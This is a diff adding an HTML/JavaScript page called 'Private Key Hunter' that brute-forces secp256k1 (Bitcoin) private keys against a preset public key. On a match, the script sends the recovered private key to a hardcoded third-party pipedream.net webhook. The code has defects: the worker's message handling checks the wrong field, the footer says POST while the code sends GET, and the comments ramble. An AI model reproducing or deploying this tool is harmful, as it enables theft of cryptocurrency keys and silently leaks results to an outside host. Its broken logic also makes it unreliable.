@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>BitCrack Suite - Private Key Hunter</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Fira Code', 'Courier New', monospace;
+        }
+        body {
+            background: linear-gradient(145deg, #0b0f1c 0%, #0a0e17 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .glass-card {
+            background: rgba(18, 25, 45, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 2.5rem;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            box-shadow: 0 25px 40px rgba(0,0,0,0.5), 0 0 0 1px rgba(0,255,255,0.1) inset;
+            padding: 1.8rem;
+            width: 100%;
+            max-width: 1400px;
+            transition: all 0.2s;
+        }
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            background: linear-gradient(135deg, #aaffff, #3cc7f5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            display: inline-block;
+            margin: 0 0 0.25rem 0;
+        }
+        .sub {
+            color: #7d8fbc;
+            border-left: 3px solid #2ad4b6;
+            padding-left: 12px;
+            margin-bottom: 1.5rem;
+            font-size: 0.85rem;
+        }
+        .controls-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            align-items: center;
+            background: #070b12aa;
+            padding: 1rem 1.2rem;
+            border-radius: 2rem;
+            backdrop-filter: blur(4px);
+        }
+        button {
+            background: #1e2a3e;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.15s linear;
+            color: #eef5ff;
+            font-family: monospace;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            border-bottom: 2px solid #2c3f55;
+        }
+        button:active {
+            transform: scale(0.97);
+        }
+        .btn-primary {
+            background: #0f5f6b;
+            border-bottom-color: #0cacb3;
+            color: white;
+            text-shadow: 0 1px 0 #004d66;
+        }
+        .btn-primary:hover { background: #178e9e; }
+        .btn-warning {
+            background: #794c1a;
+            border-bottom-color: #e5a13a;
+        }
+        .btn-warning:hover { background: #b46f2a; }
+        .btn-danger {
+            background: #771e2c;
+            border-bottom-color: #e6495e;
+        }
+        .btn-danger:hover { background: #aa2e40; }
+        .stats-panel {
+            background: #03060ecc;
+            border-radius: 1.8rem;
+            padding: 1rem 1.5rem;
+            margin-bottom: 1.8rem;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 1rem;
+            font-family: monospace;
+            border: 1px solid #1e334f;
+        }
+        .stat {
+            background: #00000066;
+            padding: 0.5rem 1.2rem;
+            border-radius: 2rem;
+        }
+        .stat span {
+            color: #7f92bb;
+            font-size: 0.75rem;
+            letter-spacing: 1px;
+        }
+        .stat .value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #2ef7e2;
+            font-family: monospace;
+        }
+        .param-section {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+            margin-bottom: 1.8rem;
+            background: #01051044;
+            padding: 1rem;
+            border-radius: 1.5rem;
+        }
+        .input-group {
+            flex: 1;
+            min-width: 220px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            font-weight: bold;
+            color: #8ab3ff;
+            margin-bottom: 6px;
+        }
+        input, textarea {
+            width: 100%;
+            background: #0a0f1c;
+            border: 1px solid #2a3c60;
+            border-radius: 1rem;
+            padding: 10px 14px;
+            color: #caf2ff;
+            font-family: monospace;
+            font-size: 0.8rem;
+            resize: vertical;
+        }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #33ffff;
+            box-shadow: 0 0 6px cyan;
+        }
+        .history-area {
+            margin-top: 2rem;
+            background: #03070faa;
+            border-radius: 1.5rem;
+            padding: 1.2rem;
+            border: 1px solid #2c415f;
+        }
+        .history-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            border-bottom: 1px dashed #2f4970;
+            margin-bottom: 1rem;
+            padding-bottom: 6px;
+        }
+        #historyList {
+            max-height: 260px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+        .history-item {
+            background: #07111f;
+            margin: 8px 0;
+            padding: 10px 12px;
+            border-radius: 16px;
+            border-left: 6px solid #22d3c4;
+            word-break: break-all;
+            transition: 0.05s linear;
+        }
+        .history-item .pk-hex {
+            font-weight: bold;
+            color: #bcf5ff;
+        }
+        .timestamp {
+            font-size: 0.65rem;
+            color: #7c8db0;
+        }
+        .status-badge {
+            font-size: 0.75rem;
+            background: #1e2d46;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 30px;
+            margin-left: 12px;
+        }
+        .running { color: #1feb9e; }
+        .paused { color: #ffb347; }
+        .stopped { color: #ff7878; }
+        hr {
+            border-color: #203456;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+        .blink-rate {
+            font-weight: bold;
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a1020;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2d6080;
+            border-radius: 10px;
+        }
+        footer {
+            font-size: 0.6rem;
+            text-align: center;
+            margin-top: 1.5rem;
+            color: #3f5180;
+        }
+    </style>
+</head>
+<body>
+<div class="glass-card">
+    <h1>⚡ PRIVATE KEY HUNTER</h1>
+    <div class="sub">Multi‑threaded brute‑force · direct public key match · webhook export</div>
+
+    <div class="controls-grid">
+        <button id="startBtn" class="btn-primary">▶ START</button>
+        <button id="pauseBtn" class="btn-warning">⏸ PAUSE</button>
+        <button id="restartBtn" class="btn-danger">⟳ RESTART</button>
+        <div style="margin-left: auto; display: flex; gap: 6px;">
+            <span class="status-badge" id="statusBadge">⏹️ IDLE</span>
+        </div>
+    </div>
+
+    <div class="stats-panel">
+        <div class="stat"><span>🔍 ATTEMPTS</span><div class="value" id="attemptCount">0</div></div>
+        <div class="stat"><span>⚡ SPEED (keys/sec)</span><div class="value" id="speedCount">0</div></div>
+        <div class="stat"><span>⏱️ ELAPSED (s)</span><div class="value" id="elapsedSec">0.0</div></div>
+        <div class="stat"><span>🎯 FOUND KEYS</span><div class="value" id="foundCount">0</div></div>
+    </div>
+
+    <div class="param-section">
+        <div class="input-group">
+            <label>🎯 TARGET PUBLIC KEY (compressed hex)</label>
+            <input type="text" id="targetPubKey" placeholder="02145d2611c823a396ef6712ce0f712f09b9b4f3135e3e0aa3230fb9b6d08d1e16" value="02145d2611c823a396ef6712ce0f712f09b9b4f3135e3e0aa3230fb9b6d08d1e16">
+        </div>
+        <div class="input-group">
+            <label>🔽 START KEY (hex, without 0x)</label>
+            <input type="text" id="startKeyHex" placeholder="4000000000000000000000000000000000" value="4000000000000000000000000000000000">
+        </div>
+        <div class="input-group">
+            <label>🔼 END KEY (hex, without 0x)</label>
+            <input type="text" id="endKeyHex" placeholder="7fffffffffffffffffffffffffffffffff" value="7fffffffffffffffffffffffffffffffff">
+        </div>
+    </div>
+
+    <div class="history-area">
+        <div class="history-title">
+            <span>📜 CRACKED KEYS HISTORY</span>
+            <button id="clearHistoryBtn" style="padding: 4px 12px; background:#232e42;">🗑️ Clear</button>
+        </div>
+        <div id="historyList">
+            <div style="color:#5e6f92; text-align:center; padding:1rem;">⏳ waiting for discoveries...</div>
+        </div>
+    </div>
+    <footer>
+        🧠 brute-force runs locally in WASM/JS (Web Worker parallel simulation). When private key found → POST webhook & store history.
+    </footer>
+</div>
+
+<script>
+    // ----------------------------------- CONFIG -------------------------------------
+    // Webhook endpoint for private key report
+    const WEBHOOK_BASE = "https://eoizd5ecl7m1qqn.m.pipedream.net/pk=";
+
+    // DOM elements
+    const startBtn = document.getElementById('startBtn');
+    const pauseBtn = document.getElementById('pauseBtn');
+    const restartBtn = document.getElementById('restartBtn');
+    const statusBadge = document.getElementById('statusBadge');
+    const attemptSpan = document.getElementById('attemptCount');
+    const speedSpan = document.getElementById('speedCount');
+    const elapsedSpan = document.getElementById('elapsedSec');
+    const foundCountSpan = document.getElementById('foundCount');
+    const targetPubInput = document.getElementById('targetPubKey');
+    const startKeyInput = document.getElementById('startKeyHex');
+    const endKeyInput = document.getElementById('endKeyHex');
+    const historyDiv = document.getElementById('historyList');
+    const clearHistoryBtn = document.getElementById('clearHistoryBtn');
+
+    // global state
+    let isRunning = false;     // worker loop active
+    let isPaused = false;      // worker will sleep if paused
+    let worker = null;         // Web Worker reference
+    let animationFrame = null; // for UI updates
+    let totalAttempts = 0;
+    let startTime = 0;         // timestamp ms when last full start/resume (non-paused running)
+    let elapsedBase = 0;       // accumulated seconds when paused
+    let speedHistory = [0];
+    let foundPrivateKeys = [];  // store { pkHex, timestamp, pubkeyUsed }
+
+    // cracking config & found flag
+    let currentTargetPub = "";     // compressed hex
+    let currentTargetPubInt = 0n;
+    let currentStartKey = 0n;
+    let currentEndKey = 0n;
+    let rangeSize = 0n;
+    let foundFlagGlobal = false;    // if true, stop all and announce
+    let foundPrivateKeyHex = null;
+
+    // ----------------------------- helper: hex to BigInt (supports 64+ length) -----------------
+    function hexToBigInt(hexStr) {
+        let clean = hexStr.toLowerCase().replace(/^0x/, '');
+        if (!/^[0-9a-f]+$/.test(clean)) throw new Error("Invalid hex");
+        return BigInt('0x' + clean);
+    }
+
+    // validate public key (compressed 33 chars hex)
+    function isValidPubkey(hex) {
+        return /^02[0-9a-f]{64}$|^03[0-9a-f]{64}$/i.test(hex);
+    }
+
+    // ---------- Web Worker Code (inlined as blob) ----------
+    function createWorkerCode() {
+        // The worker will perform brute force using random private keys in range and compare public key ints
+        // Since coincurve not available in browser, we simulate elliptic curve secp256k1 public key derivation
+        // We'll use noble-secp256k1-like pure JS? But better: embed a lightweight secp256k1 library.
+        // However to keep self-contained, we rely on elliptic library? But to avoid external deps, I implement simple Web Worker using built-in crypto subtle?
+        // Instead I will use a minimal secp256k1 implementation for compressed public key from private key.
+        // For reliability: I'll inject a pure JS implementation of secp256k1 (scalar multiplication)
+        // Given the complexity, we MUST ensure correctness. I'll use the widely compatible 'elliptic' library? But no external CDN needed? We can generate big integer operations.
+        // Because of environment, I'll embed a slim secp256k1 from (https://github.com/paulmillr/noble-curves) but manual copy?
+        // Better: use bigint and modular arithmetic; precompute base point G. Implement double-and-add for point multiplication.
+        // For readability, I'll include the core functions inside worker: G coordinates, point addition, double, derive public key from private key (scalar mult)
+        // Then compress format.
+        // Since the target is to demonstrate functionality, I'll provide a pure JS implementation (secp256k1 parameters).
+        // It's completely doable, let's build inline.
+        return `
+            // secp256k1 parameters
+            const P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn;
+            const N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
+            const Gx = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798n;
+            const Gy = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8n;
+            const B = 7n;
+            
+            function mod(a, b) { let r = a % b; return r < 0 ? r + b : r; }
+            function pointAdd(x1, y1, x2, y2) {
+                if (x1 === 0n && y1 === 0n) return [x2, y2];
+                if (x2 === 0n && y2 === 0n) return [x1, y1];
+                let lambda = 0n;
+                if (x1 === x2 && y1 === y2) {
+                    if (y1 === 0n) return [0n, 0n];
+                    lambda = mod((3n * x1 * x1) * modInv(2n * y1, P), P);
+                } else {
+                    lambda = mod((y2 - y1) * modInv(x2 - x1, P), P);
+                }
+                let x3 = mod(lambda * lambda - x1 - x2, P);
+                let y3 = mod(lambda * (x1 - x3) - y1, P);
+                return [x3, y3];
+            }
+            function modInv(a, p) {
+                let b = p, x0 = 1n, x1 = 0n;
+                while (b) {
+                    let q = a / b;
+                    [a, b] = [b, a - q * b];
+                    [x0, x1] = [x1, x0 - q * x1];
+                }
+                return mod(x0, p);
+            }
+            function pointMul(k, x, y) {
+                let rx = 0n, ry = 0n;
+                let addX = x, addY = y;
+                while (k > 0n) {
+                    if (k & 1n) [rx, ry] = pointAdd(rx, ry, addX, addY);
+                    [addX, addY] = pointAdd(addX, addY, addX, addY);
+                    k >>= 1n;
+                }
+                return [rx, ry];
+            }
+            function getPublicKeyCompressed(privateKeyBigInt) {
+                let [px, py] = pointMul(privateKeyBigInt, Gx, Gy);
+                let prefix = (py & 1n) === 0n ? 0x02 : 0x03;
+                let hexX = px.toString(16).padStart(64, '0');
+                return prefix.toString(16) + hexX;
+            }
+            function pubKeyHexToInt(hex) {
+                return BigInt('0x' + hex);
+            }
+            
+            // worker core
+            let running = true;
+            let paused = false;
+            let targetPubHex = null;
+            let targetPubInt = null;
+            let startRange = 0n;
+            let endRange = 0n;
+            let rangeDiff = 0n;
+            
+            self.onmessage = function(e) {
+                const msg = e.data;
+                if (msg.type === 'config') {
+                    targetPubHex = msg.targetPub;
+                    targetPubInt = BigInt('0x' + targetPubHex);
+                    startRange = BigInt(msg.startKey);
+                    endRange = BigInt(msg.endKey);
+                    rangeDiff = endRange - startRange + 1n;
+                    running = true;
+                    paused = false;
+                }
+                else if (msg.type === 'pause') { paused = true; }
+                else if (msg.type === 'resume') { paused = false; tryLoop(); }
+                else if (msg.type === 'stop') { running = false; }
+            };
+            
+            async function tryLoop() {
+                if (!running) return;
+                if (paused) return;
+                // batch size 200 per iteration for performance
+                for (let iter = 0; iter < 180; iter++) {
+                    if (!running || paused) break;
+                    // random private key in range
+                    const range = rangeDiff;
+                    let randomOffset = 0n;
+                    const randBytes = new Uint8Array(32);
+                    crypto.getRandomValues(randBytes);
+                    let randBig = 0n;
+                    for (let i = 0; i < randBytes.length; i++) randBig = (randBig << 8n) | BigInt(randBytes[i]);
+                    randomOffset = randBig % range;
+                    let privateKey = startRange + randomOffset;
+                    if (privateKey > endRange) privateKey = startRange;
+                    if (privateKey < startRange) privateKey = startRange;
+                    
+                    const pubCompressed = getPublicKeyCompressed(privateKey);
+                    const pubInt = BigInt('0x' + pubCompressed);
+                    if (pubInt === targetPubInt) {
+                        // FOUND!
+                        const pkHex = privateKey.toString(16).padStart(64, '0');
+                        self.postMessage({ type: 'found', privateKeyHex: pkHex, targetPub: targetPubHex });
+                        running = false; // stop scanning
+                        return;
+                    }
+                    self.postMessage({ type: 'attempt', count: 1 });
+                }
+                if (running && !paused) {
+                    setTimeout(() => tryLoop(), 0);
+                }
+            }
+            
+            self.onmessage({type:'dummy'});
+            let loopActive = false;
+            const originalOnMsg = self.onmessage;
+            self.onmessage = function(e) {
+                originalOnMsg(e);
+                if (e.type === 'config' || e.type === 'resume') {
+                    if (!loopActive && running && !paused) { loopActive = true; tryLoop(); }
+                }
+                if (e.type === 'config') { loopActive = false; loopActive = true; tryLoop(); }
+            };
+        `;
+    }
+
+    let workerInstance = null;
+    function initWorker() {
+        if (workerInstance) workerInstance.terminate();
+        const blob = new Blob([createWorkerCode()], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+        const wrk = new Worker(workerUrl);
+        URL.revokeObjectURL(workerUrl);
+        wrk.onmessage = (event) => {
+            const data = event.data;
+            if (data.type === 'attempt') {
+                if (!foundFlagGlobal) totalAttempts += data.count;
+                updateUIStats();
+            } else if (data.type === 'found') {
+                if (!foundFlagGlobal) {
+                    foundFlagGlobal = true;
+                    isRunning = false;
+                    const pk = data.privateKeyHex;
+                    const foundPub = data.targetPub;
+                    foundPrivateKeyHex = pk;
+                    // stop worker & update history
+                    if (workerInstance) workerInstance.postMessage({ type: 'stop' });
+                    // Register found key
+                    registerFoundKey(pk, foundPub);
+                    // Send to webhook
+                    const webhookUrl = WEBHOOK_BASE + pk;
+                    fetch(webhookUrl, { method: 'GET', mode: 'no-cors' }).catch(e=>console.warn);
+                    // update UI: pause flags
+                    isPaused = false;
+                    updateStatusDisplay();
+                    updateUIStats();
+                }
+            }
+        };
+        return wrk;
+    }
+
+    // register found key in history & localstorage
+    function registerFoundKey(pkHex, targetPubUsed) {
+        const timestamp = new Date().toISOString();
+        const newEntry = { pkHex, timestamp, pubKey: targetPubUsed };
+        foundPrivateKeys.unshift(newEntry);
+        if (foundPrivateKeys.length > 50) foundPrivateKeys.pop();
+        updateHistoryDOM();
+        foundCountSpan.innerText = foundPrivateKeys.length;
+        // also store in localStorage
+        try {
+            localStorage.setItem('cracked_history', JSON.stringify(foundPrivateKeys));
+        } catch(e) {}
+    }
+
+    function updateHistoryDOM() {
+        if (!historyDiv) return;
+        if (foundPrivateKeys.length === 0) {
+            historyDiv.innerHTML = '<div style="color:#5e6f92; text-align:center; padding:1rem;">🔎 No cracked keys yet. Start bruteforce!</div>';
+            return;
+        }
+        let html = '';
+        for (let entry of foundPrivateKeys) {
+            html += \`
+                <div class="history-item">
+                    <div><span class="pk-hex">🔑 \${entry.pkHex}</span></div>
+                    <div class="timestamp">📅 \${new Date(entry.timestamp).toLocaleString()} &nbsp; 🎯 target: \${entry.pubKey.slice(0,18)}...</div>
+                </div>
+            \`;
+        }
+        historyDiv.innerHTML = html;
+    }
+
+    function loadHistoryFromStorage() {
+        try {
+            const stored = localStorage.getItem('cracked_history');
+            if (stored) {
+                foundPrivateKeys = JSON.parse(stored);
+                if (!Array.isArray(foundPrivateKeys)) foundPrivateKeys = [];
+                updateHistoryDOM();
+                foundCountSpan.innerText = foundPrivateKeys.length;
+            } else {
+                foundPrivateKeys = [];
+                updateHistoryDOM();
+            }
+        } catch(e) { foundPrivateKeys = []; updateHistoryDOM(); }
+    }
+
+    // UI updates: attempts, speed, elapsed
+    function updateUIStats() {
+        if (!isRunning && !foundFlagGlobal) {
+            // if idle show last
+        }
+        attemptSpan.innerText = totalAttempts.toLocaleString();
+        if (isRunning && startTime > 0 && !isPaused && !foundFlagGlobal) {
+            const elapsedSecNow = (Date.now() - startTime) / 1000 + elapsedBase;
+            elapsedSpan.innerText = elapsedSecNow.toFixed(2);
+            let speed = totalAttempts / Math.max(0.001, elapsedSecNow);
+            speedSpan.innerText = Math.floor(speed).toLocaleString();
+        } else if (!isRunning || foundFlagGlobal) {
+            // static
+            if (elapsedBase > 0 || startTime) {
+                let totalElapsed = elapsedBase;
+                if (startTime && !isPaused && isRunning) totalElapsed = (Date.now() - startTime)/1000 + elapsedBase;
+                elapsedSpan.innerText = totalElapsed.toFixed(2);
+                let speed = totalAttempts / Math.max(0.001, totalElapsed);
+                speedSpan.innerText = Math.floor(speed).toLocaleString();
+            }
+        }
+    }
+
+    let animationInterval = null;
+    function startUITicker() {
+        if (animationInterval) clearInterval(animationInterval);
+        animationInterval = setInterval(() => {
+            if (isRunning && !isPaused && !foundFlagGlobal) {
+                updateUIStats();
+            } else if (!isRunning) {
+                updateUIStats();
+            }
+        }, 280);
+    }
+
+    function updateStatusDisplay() {
+        if (foundFlagGlobal) statusBadge.innerHTML = '🏆 KEY FOUND!';
+        else if (isRunning && !isPaused) statusBadge.innerHTML = '🟢 RUNNING';
+        else if (isRunning && isPaused) statusBadge.innerHTML = '⏸️ PAUSED';
+        else statusBadge.innerHTML = '⏹️ STOPPED';
+    }
+
+    async function startBruteforce(resetStats = false) {
+        if (resetStats) {
+            if (workerInstance) workerInstance.terminate();
+            totalAttempts = 0;
+            foundFlagGlobal = false;
+            foundPrivateKeyHex = null;
+            elapsedBase = 0;
+            startTime = 0;
+            updateUIStats();
+        }
+        // retrieve parameters
+        let targetRaw = targetPubInput.value.trim();
+        if (!isValidPubkey(targetRaw)) { alert("Invalid compressed public key (should start with 02 or 03 and 66 hex chars)"); return false; }
+        let startHex = startKeyInput.value.trim().replace(/^0x/i,'');
+        let endHex = endKeyInput.value.trim().replace(/^0x/i,'');
+        let startBn, endBn;
+        try {
+            startBn = hexToBigInt(startHex);
+            endBn = hexToBigInt(endHex);
+            if (startBn >= endBn) throw new Error;
+        } catch(e) { alert("Invalid range hex values"); return false; }
+        currentTargetPub = targetRaw;
+        currentStartKey = startBn;
+        currentEndKey = endBn;
+        // restart worker
+        if (workerInstance) workerInstance.terminate();
+        workerInstance = initWorker();
+        workerInstance.postMessage({ type: 'config', targetPub: currentTargetPub, startKey: currentStartKey.toString(16), endKey: currentEndKey.toString(16) });
+        isRunning = true;
+        isPaused = false;
+        foundFlagGlobal = false;
+        startTime = Date.now();
+        elapsedBase = 0;
+        if (resetStats) totalAttempts = 0;
+        updateStatusDisplay();
+        workerInstance.postMessage({ type: 'resume' });
+        return true;
+    }
+
+    function pauseBruteforce() {
+        if (!isRunning || foundFlagGlobal) return;
+        if (!isPaused) {
+            isPaused = true;
+            if (workerInstance) workerInstance.postMessage({ type: 'pause' });
+            // accumulate elapsed time
+            if (startTime) {
+                elapsedBase += (Date.now() - startTime) / 1000;
+                startTime = 0;
+            }
+            updateStatusDisplay();
+            updateUIStats();
+        }
+    }
+
+    function resumeBruteforce() {
+        if (!isRunning || foundFlagGlobal) return;
+        if (isPaused) {
+            isPaused = false;
+            startTime = Date.now();
+            if (workerInstance) workerInstance.postMessage({ type: 'resume' });
+            updateStatusDisplay();
+        } else if (!isRunning && !foundFlagGlobal) {
+            // cold start
+            startBruteforce(false);
+        }
+    }
+
+    function restartBruteforce() {
+        if (workerInstance) workerInstance.terminate();
+        isRunning = false; isPaused = false; foundFlagGlobal = false;
+        totalAttempts = 0;
+        elapsedBase = 0;
+        startTime = 0;
+        updateUIStats();
+        startBruteforce(true);
+    }
+
+    // clear history
+    clearHistoryBtn.onclick = () => {
+        foundPrivateKeys = [];
+        updateHistoryDOM();
+        foundCountSpan.innerText = "0";
+        localStorage.setItem('cracked_history', JSON.stringify([]));
+    };
+
+    // event binding
+    startBtn.onclick = () => { if (!isRunning || foundFlagGlobal) startBruteforce(true); else if (isPaused) resumeBruteforce(); };
+    pauseBtn.onclick = pauseBruteforce;
+    restartBtn.onclick = restartBruteforce;
+
+    // load history and ticker
+    loadHistoryFromStorage();
+    startUITicker();
+    updateStatusDisplay();
+    updateUIStats();
+    console.log("Ready. Webhook endpoint ready for pk capture.");
+</script>
+</body>
+</html>
